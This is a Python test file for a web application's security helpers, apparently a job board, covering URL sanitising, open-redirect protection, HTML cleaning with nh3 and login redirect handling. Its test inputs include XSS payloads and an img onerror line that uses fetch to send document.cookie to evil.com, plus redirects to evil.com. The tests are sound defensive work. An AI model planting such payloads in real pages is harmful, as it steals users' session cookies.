import base64
import json

import nh3
from httpx import AsyncClient
from itsdangerous import TimestampSigner

from app.utils import is_safe_redirect, sanitize_url


def _make_session(data: dict) -> str:
    """Build a signed Starlette session cookie using the app's actual secret key."""
    from app.config import settings
    payload = base64.b64encode(json.dumps(data).encode()).decode()
    return TimestampSigner(settings.SECRET_KEY).sign(payload).decode()


# ---------------------------------------------------------------------------
# sanitize_url
# ---------------------------------------------------------------------------

def test_sanitize_url_allows_http():
    assert sanitize_url("http://example.com/apply") == "http://example.com/apply"


def test_sanitize_url_allows_https():
    assert sanitize_url("https://example.com/apply") == "https://example.com/apply"


def test_sanitize_url_strips_surrounding_whitespace():
    assert sanitize_url("  https://example.com  ") == "https://example.com"


def test_sanitize_url_blocks_javascript_scheme():
    assert sanitize_url("javascript:alert(document.cookie)") is None


def test_sanitize_url_blocks_data_uri():
    assert sanitize_url("data:text/html,<script>alert(1)</script>") is None


def test_sanitize_url_returns_none_for_none():
    assert sanitize_url(None) is None


def test_sanitize_url_returns_none_for_empty_string():
    assert sanitize_url("") is None
    assert sanitize_url("   ") is None


# ---------------------------------------------------------------------------
# is_safe_redirect
# ---------------------------------------------------------------------------

def test_is_safe_redirect_allows_root():
    assert is_safe_redirect("/") is True


def test_is_safe_redirect_allows_relative_paths():
    assert is_safe_redirect("/jobs") is True
    assert is_safe_redirect("/auth/login?error=1") is True


def test_is_safe_redirect_blocks_http_url():
    assert is_safe_redirect("http://evil.com") is False


def test_is_safe_redirect_blocks_https_url():
    assert is_safe_redirect("https://evil.com") is False


def test_is_safe_redirect_blocks_protocol_relative():
    # //evil.com has no scheme but has a host — still external
    assert is_safe_redirect("//evil.com") is False


def test_is_safe_redirect_blocks_empty():
    assert is_safe_redirect("") is False


# ---------------------------------------------------------------------------
# XSS sanitization (nh3)
# ---------------------------------------------------------------------------

def test_nh3_strips_script_tags():
    dirty = "<p>Good content</p><script>alert('xss')</script>"
    clean = nh3.clean(dirty)
    assert "<script>" not in clean
    assert "Good content" in clean


def test_nh3_strips_event_handler_attributes():
    dirty = '<img src="x" onerror="fetch(\'https://evil.com?c=\'+document.cookie)">'
    clean = nh3.clean(dirty)
    assert "onerror" not in clean
    assert "evil.com" not in clean


def test_nh3_preserves_safe_formatting():
    # Job descriptions may contain basic HTML — nh3 should leave it intact
    safe = "<p>Hello <strong>world</strong></p>"
    assert nh3.clean(safe) == safe


# ---------------------------------------------------------------------------
# Open redirect — HTTP integration
# ---------------------------------------------------------------------------

async def test_login_blocks_external_next_for_logged_in_user(client: AsyncClient, user):
    """Already-logged-in user visiting /auth/login?next=https://evil.com
    must be sent to / not to the external URL."""
    client.cookies.set("session", _make_session({"user_id": user.id}))
    response = await client.get(
        "/auth/login?next=https://evil.com",
        follow_redirects=False,
    )
    assert response.status_code in (302, 303, 307, 308)
    assert response.headers["location"] == "/"


async def test_login_allows_safe_next_for_logged_in_user(client: AsyncClient, user):
    """Already-logged-in user visiting /auth/login?next=/jobs
    should be sent to /jobs."""
    client.cookies.set("session", _make_session({"user_id": user.id}))
    response = await client.get(
        "/auth/login?next=/jobs",
        follow_redirects=False,
    )
    assert response.status_code in (302, 303, 307, 308)
    assert response.headers["location"] == "/jobs"


async def test_login_page_does_not_store_external_next_in_session(client: AsyncClient):
    """Unauthenticated visit with ?next=https://evil.com should show the login
    page normally — the evil URL must not be persisted in the session cookie."""
    response = await client.get(
        "/auth/login?next=https://evil.com",
        follow_redirects=False,
    )
    # Login page renders normally (200) — no redirect to evil.com
    assert response.status_code == 200
    # Session cookie should either be absent or not contain the evil URL
    session_cookie = response.cookies.get("session", "")
    assert "evil.com" not in session_cookie
